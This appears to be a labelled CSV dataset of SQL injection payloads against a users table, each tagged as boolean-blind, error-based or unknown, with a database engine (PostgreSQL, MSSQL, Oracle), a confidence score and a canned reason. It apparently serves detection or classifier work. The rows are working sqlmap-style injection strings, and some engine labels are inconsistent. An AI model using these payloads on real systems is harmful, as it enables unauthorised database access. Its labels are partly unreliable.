id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
40035,"select * from users WHERE username = ""-1549\' ) and ( \'fnwx\' = \'fnwx"" or username = ""-6190\' ) where 2621 = 2621",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
40036,"select * from users WHERE username = ""1 or username = ""-1254"" and username = ""1\' ) ) )",boolean_blind,generic,0.70,Boolean Blind detected: SQL structure with complex syn,1
40037,"select * from users WHERE username = ""1\'+ ( select \'ueak\' where 7329 = 7329 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) ) +\'"" and username = ""-3859 )",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
40038,"select * from users WHERE username = ""1%\' and username = ""-9564 and username = ""-6190\' ) where 2621 = 2621 or username = ""-7242\'",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
40039,"select * from users WHERE username = ""1\' ) as wpmv where 1479 = 1479 and username = ""-1641\' ) ) or username = ""-2733\' ) ) )",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
40040,"1 or username = ""-9770\' ) ) as ovhh where 7903 = 7903 and username = ""1%\' ) ) and ( ( \'%\' = \'",unknown,generic,0.50,Insufficient data to classify payload type,1
40041,"select * from users WHERE username = ""-4952\' ) ) ) or username = ""-1854\' ) as fmmq where 7326 = 7326 or username = ""1\' ) where 1502 = 1502",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
40042,1\'+ ( select onzd where 8452 = 8452 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) ) +\',error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
40043,"1\' ) ) ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and username = ""1 where 5161 = 5161 or username = ""-4322\' ) ) as magw where 1627 = 1627 or# 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) --",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
40044,"1 ) or username = ""-1344 ) as gqgi where 2545 = 2545 and username = ""-1254",unknown,generic,0.50,Insufficient data to classify payload type,1
40045,"1 ) ) and ( ( 5139 = 5139"" or username = ""1 ) ) ) and ( ( ( 4694 = 4694",unknown,generic,0.50,Insufficient data to classify payload type,1
40046,"select * from users WHERE username = ""1\' ) as pogx where 4105 = 4105 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --"" and username = ""1\' ) )",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
40047,"1 where 5161 = 5161 or username = ""-4322\' ) ) as magw where 1627 = 1627 or# 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) --",error_based,oracle,0.85,Error Based detected: character extraction (oracle),1
40048,"select * from users WHERE username = ""1\' in boolean mode ) or username = ""-7323%"" and username = ""-9987 ) ) )",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
40049,"select * from users WHERE username = ""-8163 ) ) as cvai where 2360 = 2360 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --"" and username = ""-8860 )",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
40050,"select * from users WHERE username = ""1\' ) and username = ""-1254"" and username = ""-2756\' where 6156 = 6156",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
40051,"select * from users WHERE username = ""1\' and \'fbzo\' like \'fbzo"" and username = ""1\' ) ) )",boolean_blind,generic,0.70,Boolean Blind detected: SQL structure with complex syn,1
40052,"select * from users WHERE username = ""-1254"" or username = ""1\' ) ) ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric )",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
40053,"1 or username = ""1%\' ) ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( \'%\' = \'",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
40054,"-7199\' or username = ""1%\' and \'%\' = \'"" or username = ""-1641\' ) ) and ( ( \'vgcb\' like \'vgcb",unknown,generic,0.50,Insufficient data to classify payload type,1
40055,"1\' ) ) as bswc where 1635 = 1635 or username = ""-9501\' ) and username = ""1\' and \'fbzo\' like \'fbzo",unknown,generic,0.50,Insufficient data to classify payload type,1
40056,"select * from users WHERE username = ""1\' ) and username = ""1\' ) ) and username = ""1\' ) ) ) and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) )",error_based,mssql,0.85,Error Based detected: character extraction (mssql),1
40057,"1 and username = ""1\'+ ( select \'ueak\' where 7329 = 7329 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) ) +\'",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
40058,1 ) ) as dgso where 4654 = 4654 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --,error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
40059,"select * from users WHERE username = ""1"" and ( ( ( 6395 = 6395"" or username = ""1\' ) )",boolean_blind,generic,0.70,Boolean Blind detected: SQL structure with complex syn,1
40060,"select * from users WHERE username = ""-5863"" and ""gkvy"" = ""gkvy"" and username = ""1%"" and username = ""1 where 5161 = 5161",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
40061,"select * from users WHERE username = ""-1889%\' ) ) ) and ( ( ( \'%\' = \'"" and username = ""1"" or username = ""1\' where 8537 = 8537",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
40062,"select * from users WHERE username = ""1"" or username = ""-3424\' ) ) and ( ( \'dyuo\' = \'dyuo"" and username = ""-5313\' ) ) )",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
40063,"select * from users WHERE username = ""-9770\' ) ) as ovhh where 7903 = 7903 or username = ""-8007\' ) ) as bgpp where 9555 = 9555 and username = ""1\' ) ) as plbt where 4368 = 4368",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
40064,"select * from users WHERE username = ""-7242\' or username = ""1\'+ ( select oljg where 2006 = 2006 and username = ""-1254"" and username = ""1",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
40065,"select * from users WHERE username = ""-4582 ) ) as gvfo where 8885 = 8885 and username = ""-2783%\' ) ) and username = ""-2495 ) ) as hudw where 4197 = 4197",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
40066,"-4248 where 3288 = 3288 or username = ""-4582 ) ) as gvfo where 8885 = 8885 and username = ""-6036 ) ) ) and ( ( ( 6723 = 6723",unknown,generic,0.50,Insufficient data to classify payload type,1
40067,"select * from users WHERE username = ""1%\' ) and ( \'%\' = \'"" or username = ""1\' ) ) as plbt where 4368 = 4368",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
40068,"1\' where 8537 = 8537 or username = ""1%\' ) ) ) and ( ( ( \'%\' = \'",unknown,generic,0.50,Insufficient data to classify payload type,1
40069,-9847%\' ) ) ) and ( ( ( \'%\' = \',unknown,generic,0.50,Insufficient data to classify payload type,1
40070,"-3100\' ) and ( \'etuj\' like \'etuj"" and username = ""1"" or username = ""-1344 ) as gqgi where 2545 = 2545 and username = ""1%",unknown,generic,0.50,Insufficient data to classify payload type,1
40071,"1 ) ) ) or username = ""1\' ) ) as eltx where 9955 = 9955 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
40072,"1\' ) ) ) or username = ""-5313\' ) ) ) or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( ( \'wkkp\' like \'wkkp",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
40073,"-5863"" and ""gkvy"" = ""gkvy"" or username = ""1\' and \'fbzo\' like \'fbzo",unknown,generic,0.50,Insufficient data to classify payload type,1
40074,"select * from users WHERE username = ""-8007\' ) ) as bgpp where 9555 = 9555 and username = ""1"" or username = ""1 and username = ""-8007\' ) ) as bgpp where 9555 = 9555",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
40075,1%\' ) ) ) and ( ( ( \'%\' = \',unknown,generic,0.50,Insufficient data to classify payload type,1
40076,"select * from users WHERE username = ""1%\' ) ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and username = ""1 or username = ""-4610\' ) )",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
40077,"select * from users WHERE username = ""-5313\' ) ) ) or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) or username = ""1"" or username = ""-8007\' ) ) as bgpp where 9555 = 9555",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
40078,"-2348 ) as sige where 1639 = 1639 and username = ""1\' ) as pogx where 4105 = 4105 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
40079,"-3978 and username = ""1"" and username = ""1",unknown,generic,0.50,Insufficient data to classify payload type,1
40080,"1 ) ) as dgso where 4654 = 4654 or username = ""1 or username = ""1",unknown,generic,0.50,Insufficient data to classify payload type,1
40081,"select * from users WHERE username = ""1 where 5161 = 5161 and username = ""-9770\' ) ) as ovhh where 7903 = 7903 and username = ""-1254"" or username = ""1\' ) ) )",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
40082,"select * from users WHERE username = ""1"" and username = ""-1344 ) as gqgi where 2545 = 2545 and username = ""1"" and username = ""1\' ) where 1502 = 1502",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
40083,"1%\' and username = ""-9564 and username = ""-6190\' ) where 2621 = 2621 and username = ""1",unknown,generic,0.50,Insufficient data to classify payload type,1
40084,"select * from users WHERE username = ""-6036 ) ) ) or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and username = ""-7072\' )",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
40085,"select * from users WHERE username = ""1 where 5161 = 5161 or username = ""-4322\' ) ) as magw where 1627 = 1627 or username = ""1 ) ) as xoch where 8765 = 8765 and username = ""-2756\' where 6156 = 6156",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
40086,"-8007\' ) ) as bgpp where 9555 = 9555 or username = ""1",unknown,generic,0.50,Insufficient data to classify payload type,1
40087,"select * from users WHERE username = ""-7242\' and \'kfff\' = \'kfff"" or username = ""1%\' ) ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric )",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
40088,"-7874 ) ) ) and username = ""-3424\' ) ) and ( ( \'dyuo\' = \'dyuo",unknown,generic,0.50,Insufficient data to classify payload type,1
40089,"-5313\' ) ) ) and ( ( ( \'wkkp\' like \'wkkp"" and username = ""1"" and username = ""-1254",unknown,generic,0.50,Insufficient data to classify payload type,1
40090,"select * from users WHERE username = ""-8069\' ) ) or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( \'qbvz\' = \'qbvz"" or username = ""-1254"" and username = ""-1344 ) as gqgi where 2545 = 2545",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
40091,"1 where 5161 = 5161 and username = ""-9770\' ) ) as ovhh where 7903 = 7903 or username = ""1"" or username = ""1",unknown,generic,0.50,Insufficient data to classify payload type,1
40092,"select * from users WHERE username = ""1%\' ) ) ) and ( ( ( \'mfmk\' = \'mfmk"" or username = ""-1254"" and username = ""-3899\' ) where 8152 = 8152",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
40093,"1%\' or username = ""1"" and username = ""-8007\' ) ) as bgpp where 9555 = 9555 and username = ""-1254",unknown,generic,0.50,Insufficient data to classify payload type,1
40094,"-9564 or username = ""-9263\' ) as qodg where 6798 = 6798 or username = ""1"" and username = ""1%",unknown,generic,0.50,Insufficient data to classify payload type,1
40095,-5352%\' ) ) ) and ( ( ( \'%\' = \',unknown,generic,0.50,Insufficient data to classify payload type,1
40096,"1\' ) ) as plbt where 4368 = 4368 AND username = ""-7430\' ) as xfah where 1596 = 1596 AND uSername = ""-8057\' ) ) aS gpue where 4205 = 4205 || 3440 = caSt ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( Select ( caSe when ( 3440 = 3440 ) then 1 elSe 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) aS numeric ) --",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
40097,"select * from users WHERE username = ""1\' ) ) as bswc where 1635 = 1635 or username = ""-9501\' ) or username = ""-5863"" and username = ""1 ) )",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
40098,"select * from users WHERE username = ""1"" and username = ""1\'+ ( select \'kicv\' where 1976 = 1976 and username = ""1"" and username = ""1%\'",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
40099,"select * from users WHERE username = ""1 where 5161 = 5161 and username = ""-9770\' ) ) as ovhh where 7903 = 7903 and username = ""1\'+ ( select onzd where 8452 = 8452",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
40100,"-5313\' ) ) ) or username = ""-8860 ) and username = ""-8007\' ) ) as bgpp where 9555 = 9555 and username = ""1",unknown,generic,0.50,Insufficient data to classify payload type,1
40101,"-5313\' ) ) ) or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and username = ""-5863",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
40102,"select * from users WHERE username = ""-9295 ) ) ) or username = ""-7430\' ) as xfah where 1596 = 1596 or username = ""-9770\' ) ) as ovhh where 7903 = 7903",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
40103,"-5313\' ) ) ) or username = ""1"" or username = ""1"" and \'kfff\' = \'kfff",unknown,generic,0.50,Insufficient data to classify payload type,1
40104,"select * from users WHERE username = ""-3424\' ) ) and ( ( \'dyuo\' = \'dyuo"" and username = ""1"" and username = ""1",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
40105,"select * from users WHERE username = ""-1254"" or username = ""1\' ) ) ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and username = ""-8163 ) ) as cvai where 2360 = 2360",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
40106,"select * from users WHERE username = ""-7323%"" and ""%"" = """" or username = ""1%\'",boolean_blind,generic,0.70,Boolean Blind detected: SQL structure with complex syn,1
40107,"select * from users WHERE username = ""-6179 ) ) and ( ( 7732 = 7732"" and username = ""-9688%\' ) ) or username = ""-8007\' ) ) as bgpp where 9555 = 9555",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
40108,"SELECT * FROM users WHERE uSername = ""-8057\' ) ) aS gpue where 4205 = 4205 || 3440 = caSt ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( Select ( caSe when ( 3440 = 3440 ) then 1 elSe 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) aS numeric ) --"" AND username = ""1\' ) ) ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric )",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
40109,"-9501\' ) and username = ""-2806\' ) ) ) or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( ( \'rxzr\' = \'rxzr",error_based,mssql,0.85,Error Based detected: character extraction (mssql),1
40110,"-5062 ) where 7457 = 7457 and username = ""-9742 ) where 8409 = 8409 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
40111,"1 ) ) as xoch where 8765 = 8765 and username = ""1%\' ) ) ) or username = ""-1254",unknown,generic,0.50,Insufficient data to classify payload type,1
40112,"1\' ) ) ) and username = ""1"" and username = ""1\'+ ( select \'kicv\' where 1976 = 1976 and username = ""1",unknown,generic,0.50,Insufficient data to classify payload type,1
40113,"-5313\' ) ) ) or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and username = ""-8860 ) and username = ""1",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
40114,"-7199\' or username = ""1\' ) ) ) and ( ( ( \'njge\' like \'njge",unknown,generic,0.50,Insufficient data to classify payload type,1
40115,"select * from users WHERE username = ""1\' ) and username = ""1\' ) ) and ( ( \'ajka\' = \'ajka"" and username = ""1 and username = ""-6190\' ) where 2621 = 2621",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
40116,"select * from users WHERE username = ""-2806\' ) ) ) or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) or username = ""-1985 ) ) ) and ( ( ( 1248 = 1248"" or username = ""-9564 and username = ""-6190\' ) where 2621 = 2621",error_based,mssql,0.85,Error Based detected: character extraction (mssql),1
40117,"1%\' ) ) ) or username = ""-1254",unknown,generic,0.50,Insufficient data to classify payload type,1
40118,"select * from users WHERE username = ""1%\' ) ) ) and ( ( ( \'%\' = \'"" and ( ( ( \'mfmk\' = \'mfmk"" and username = ""1 and username = ""-6190\' ) where 2621 = 2621",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
40119,"select * from users WHERE username = ""-5062 ) where 7457 = 7457 and username = ""-8007\' ) ) as bgpp where 9555 = 9555 and username = ""1\' ) ) as plbt where 4368 = 4368 and username = ""-7430\' ) as xfah where 1596 = 1596",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
40120,"1\' ) ) ) and username = ""-7199\' and username = ""-8828%\' ) ) ) and ( ( ( \'%\' = \'",unknown,generic,0.50,Insufficient data to classify payload type,1
40121,"1\' ) ) and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and username = ""-7199\' or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual )",error_based,oracle,0.85,Error Based detected: character extraction (oracle),1
40122,"-9505\' ) ) ) or username = ""-1549\' ) and ( \'fnwx\' = \'fnwx",unknown,generic,0.50,Insufficient data to classify payload type,1
40123,"-3899\' ) where 8152 = 8152 or username = ""1%"" and username = ""-5313\' ) ) ) and ( ( ( \'wkkp\' like \'wkkp",unknown,generic,0.50,Insufficient data to classify payload type,1
40124,"-1549\' ) and ( \'fnwx\' = \'fnwx"" and username = ""1",unknown,generic,0.50,Insufficient data to classify payload type,1
40125,"select * from users WHERE username = ""-5863"" and ( ( \'%\' = \'"" and username = ""1\' ) ) )",boolean_blind,generic,0.70,Boolean Blind detected: SQL structure with complex syn,1
40126,"-4610\' ) ) or username = ""1%\' and \'%\' = \'",unknown,generic,0.50,Insufficient data to classify payload type,1
40127,"1\' ) or username = ""-1254"" or username = ""-8007\' ) ) as bgpp where 9555 = 9555 and username = ""1",unknown,generic,0.50,Insufficient data to classify payload type,1
40128,"select * from users WHERE username = ""1"" and ""xyjg"" = ""xyjg"" and \'kfff\' = \'kfff"" and username = ""-4582 ) ) as gvfo where 8885 = 8885",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
40129,"1 and username = ""1\' ) and ( \'izyf\' = \'izyf",unknown,generic,0.50,Insufficient data to classify payload type,1
40130,"-6353%\' ) ) or username = ""-6190\' ) where 2621 = 2621 or username = ""1\' ) ) ) and ( ( ( \'njge\' like \'njge",unknown,generic,0.50,Insufficient data to classify payload type,1
40131,"select * from users WHERE username = ""-4582 ) ) as gvfo where 8885 = 8885 and username = ""1"" or username = ""-1344 ) as gqgi where 2545 = 2545",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
40132,"select * from users WHERE username = ""-5863"" and ""gkvy"" = ""gkvy"" or username = ""-5352%\' ) ) )",boolean_blind,generic,0.70,Boolean Blind detected: SQL structure with complex syn,1
